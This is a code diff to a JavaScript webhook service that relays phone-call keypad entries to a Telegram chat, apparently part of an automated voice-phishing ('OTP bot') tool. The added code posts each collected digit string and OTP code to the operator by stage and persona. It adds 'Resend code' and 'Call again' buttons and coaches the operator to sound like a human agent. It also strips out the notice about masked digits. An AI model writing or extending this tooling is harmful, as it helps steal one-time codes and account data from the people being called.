@@ -52,6 +52,31 @@ function parseBusinessContext(raw) {
   }
 }
 
+function parseStateData(payload) {
+  if (!payload) {
+    return {};
+  }
+  if (typeof payload === 'object') {
+    return payload;
+  }
+  try {
+    return JSON.parse(payload);
+  } catch (error) {
+    console.warn('Failed to parse call state payload:', error.message);
+    return {};
+  }
+}
+
+function getStageLabelFromMetadata(metadata = {}, stageKey = '') {
+  if (!stageKey) {
+    return null;
+  }
+  const normalized = normalizeStage(stageKey);
+  const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];
+  const match = sequence.find((entry) => normalizeStage(entry.stage || entry.stage_key || entry.label || '') === normalized);
+  return match?.label || match?.name || normalized.replace(/_/g, ' ');
+}
+
 function getPersonaLabel(call) {
   if (!call) {
     return 'Keypad Alert';
@@ -639,6 +664,109 @@ class EnhancedWebhookService {
     }
   }
 
+  async sendCallStepNotification(call_sid, telegram_chat_id, options = {}) {
+    try {
+      const [latestState, callDetails] = await Promise.all([
+        this.db.getLatestCallState(call_sid, 'dtmf_verified'),
+        this.db.getCall(call_sid),
+      ]);
+
+      if (!latestState || !callDetails) {
+        return true;
+      }
+
+      const stateData = parseStateData(latestState.data);
+      const metadata = parseCallMetadata(callDetails.metadata_json) || {};
+      const personaLabel = getPersonaLabel(callDetails);
+      const stageKey = stateData.stage_key || stateData.stageKey;
+      const stageLabel =
+        stateData.stage_label ||
+        getStageLabelFromMetadata(metadata, stageKey) ||
+        (stageKey ? stageKey.replace(/_/g, ' ') : 'Verification');
+      const digits = stateData.digits_preview || stateData.digits || 'None';
+      const attempts = stateData.attempts || 1;
+      const needsRetry = options.isRetry || Boolean(stateData.needs_retry) || ['mismatch', 'length_mismatch', 'value_mismatch'].includes(stateData.verification);
+      const nextStageLabel = stateData.next_stage_key
+        ? getStageLabelFromMetadata(metadata, stateData.next_stage_key) || stateData.next_stage_key.replace(/_/g, ' ')
+        : null;
+      const workflowComplete = Boolean(stateData.workflow_completed);
+
+      const lines = [];
+      const headerEmoji = needsRetry ? '🔁' : '✅';
+      lines.push(`${headerEmoji} ${personaLabel}: ${stageLabel}`);
+
+      if (needsRetry) {
+        if (stageLabel.toLowerCase().includes('otp') || stageLabel.toLowerCase().includes('code')) {
+          lines.push('Agent asked to resend the code and wait for a fresh entry.');
+        } else {
+          lines.push('Agent requested the caller to re-enter this field.');
+        }
+        lines.push(`Latest entry: ${digits}`);
+        lines.push(`Attempts: ${attempts}`);
+      } else {
+        lines.push(`${stageLabel}: ${digits}`);
+        lines.push(`Attempts: ${attempts}`);
+      }
+
+      if (!needsRetry && nextStageLabel) {
+        lines.push('');
+        lines.push(`Next: ${nextStageLabel}`);
+      } else if (workflowComplete) {
+        lines.push('');
+        lines.push('All verification steps are complete.');
+      }
+
+      const replyMarkup = needsRetry
+        ? this.buildCallFollowUpKeyboard(call_sid, 'retry', {
+            allowTranscript: false,
+            callAgainPrompt: true,
+            allowResend: stageLabel.toLowerCase().includes('code') || stageLabel.toLowerCase().includes('otp'),
+          })
+        : null;
+
+      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines), 'HTML', replyMarkup);
+      return true;
+    } catch (error) {
+      console.error('❌ Failed to send call step notification:', error);
+      return false;
+    }
+  }
+
+  async sendCallWorkflowComplete(call_sid, telegram_chat_id) {
+    try {
+      const [callDetails, inputDetails] = await Promise.all([
+        this.db.getCall(call_sid),
+        this.buildInputDetails(call_sid),
+      ]);
+
+      if (!callDetails) {
+        return true;
+      }
+
+      const personaLabel = getPersonaLabel(callDetails);
+      const lines = [
+        `🎯 ${personaLabel}: Verification complete`,
+        'Every requested field was collected successfully.',
+      ];
+
+      if (inputDetails?.text) {
+        lines.push('');
+        lines.push(inputDetails.text);
+      }
+
+      const keyboard = this.buildCallFollowUpKeyboard(call_sid, 'completed', {
+        allowTranscript: true,
+        callAgainPrompt: true,
+      });
+
+      await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines), 'HTML', keyboard);
+      return true;
+    } catch (error) {
+      console.error('❌ Failed to send workflow completion notification:', error);
+      return false;
+    }
+  }
+
   async sendCallInputSummary(call_sid, telegram_chat_id) {
     try {
       const [inputs, callDetails, dtmfEntries] = await Promise.all([
@@ -670,18 +798,12 @@ class EnhancedWebhookService {
           lines.push(`${label}: ${input.value}`);
         });
       } else {
-        const { summaryLines, containsRaw } = formatSummary(dtmfEntries);
+        const { summaryLines } = formatSummary(dtmfEntries);
         if (summaryLines.length > 0) {
           summaryLines.forEach((line) => lines.push(line));
         } else {
           lines.push('No keypad digits recorded.');
         }
-        lines.push('');
-        lines.push(
-          containsRaw
-            ? '🚧 Dev compliance mode — raw digits displayed. Handle with care.'
-            : 'Digits masked per active compliance policy.'
-        );
       }
 
       await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
@@ -775,8 +897,10 @@ class EnhancedWebhookService {
       const outcome = (call.final_outcome || '').toUpperCase();
       const lines = [];
 
+      const inputDetails = await this.buildInputDetails(call_sid);
+      let appendedInputSummary = false;
+
       if (call.call_type === 'collect_input') {
-        const inputDetails = await this.buildInputDetails(call_sid);
         if (outcome === 'ANSWERED_WITH_INPUT') {
           lines.push('✅ Call completed — input captured');
           lines.push(`To: ${maskedNumber}`);
@@ -791,6 +915,7 @@ class EnhancedWebhookService {
             lines.push(`Input: ${fallbackValue}`);
           }
           lines.push(`Duration: ${durationText}`);
+          appendedInputSummary = true;
         } else if (['ANSWERED_NO_INPUT_HUMAN', 'ANSWERED_NO_INPUT_MACHINE'].includes(outcome)) {
           lines.push('⚠️ Call completed — no input received');
           lines.push(`To: ${maskedNumber}`);
@@ -851,6 +976,12 @@ class EnhancedWebhookService {
         }
       }
 
+      if (!appendedInputSummary && inputDetails?.text) {
+        lines.push('');
+        lines.push('Inputs captured:');
+        lines.push(inputDetails.text);
+      }
+
       if (!lines.length) {
         lines.push('📞 Call update unavailable.');
       }
@@ -886,6 +1017,12 @@ class EnhancedWebhookService {
         if (Number.isFinite(confidencePercent)) {
           lines.push(`Confidence: ${confidencePercent.toFixed(1)}%`);
         }
+      }
+
+      if (label === 'human') {
+        lines.push('Caller is live. Keep the conversation flowing like a human agent.');
+      } else if (label === 'machine') {
+        lines.push('Likely voicemail or IVR detected. Pivot to a voicemail script or hang up.');
       }
 
       await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
@@ -964,6 +1101,15 @@ class EnhancedWebhookService {
         case 'call_in_progress':
           success = await this.sendCallStatusUpdate(call_sid, 'answered', telegram_chat_id);
           break;
+        case 'call_step_complete':
+        case 'call_step_retry':
+          success = await this.sendCallStepNotification(call_sid, telegram_chat_id, {
+            isRetry: notification_type === 'call_step_retry'
+          });
+          break;
+        case 'call_workflow_complete':
+          success = await this.sendCallWorkflowComplete(call_sid, telegram_chat_id);
+          break;
         case 'call_completed': {
           const [callDetails, dtmfEntries] = await Promise.all([
             this.db.getCall(call_sid),
@@ -1003,6 +1149,15 @@ class EnhancedWebhookService {
           break;
         case 'call_canceled':
           success = await this.sendCallStatusUpdate(call_sid, 'canceled', telegram_chat_id);
+          break;
+        case 'call_step_complete':
+        case 'call_step_retry':
+          success = await this.sendCallStepNotification(call_sid, telegram_chat_id, {
+            isRetry: notification_type === 'call_step_retry'
+          });
+          break;
+        case 'call_workflow_complete':
+          success = await this.sendCallWorkflowComplete(call_sid, telegram_chat_id);
           break;
         case 'call_hint_caller_listening':
         case 'call_hint_machine_detected':
@@ -1125,20 +1280,29 @@ class EnhancedWebhookService {
     const base = `FOLLOWUP_CALL:${sid}:`;
 
     const allowTranscriptButton = options.allowTranscript !== false;
+    const showCallAgainPrompt = Boolean(options.callAgainPrompt);
+    const allowResend = Boolean(options.allowResend);
 
-    const rows = [
-      [
-        { text: '📝 Send recap', callback_data: `${base}recap` },
-        { text: '⏰ Schedule follow-up', callback_data: `${base}schedule` }
-      ],
-      [
-        { text: '👤 Reassign to agent', callback_data: `${base}reassign` }
-      ]
-    ];
+    const rows = [];
+    rows.push([
+      { text: '📝 Send recap', callback_data: `${base}recap` },
+      { text: '⏰ Schedule follow-up', callback_data: `${base}schedule` }
+    ]);
 
-    // Offer transcript view only when call actually connected/completed
+    const secondRow = [];
     if (allowTranscriptButton && (status === 'completed' || status === 'answered')) {
-      rows[1].unshift({ text: '📋 View transcript', callback_data: `${base}transcript` });
+      secondRow.push({ text: '📋 View transcript', callback_data: `${base}transcript` });
+    }
+    secondRow.push({ text: '👤 Reassign to agent', callback_data: `${base}reassign` });
+    rows.push(secondRow);
+
+    if (showCallAgainPrompt) {
+      const followRow = [{ text: '☎️ Call again', callback_data: `${base}call-again` }];
+      if (allowResend) {
+        followRow.push({ text: '📨 Resend code', callback_data: `${base}resend` });
+      }
+      followRow.push({ text: '⏭️ Skip', callback_data: `${base}skip` });
+      rows.push(followRow);
     }
 
     return {
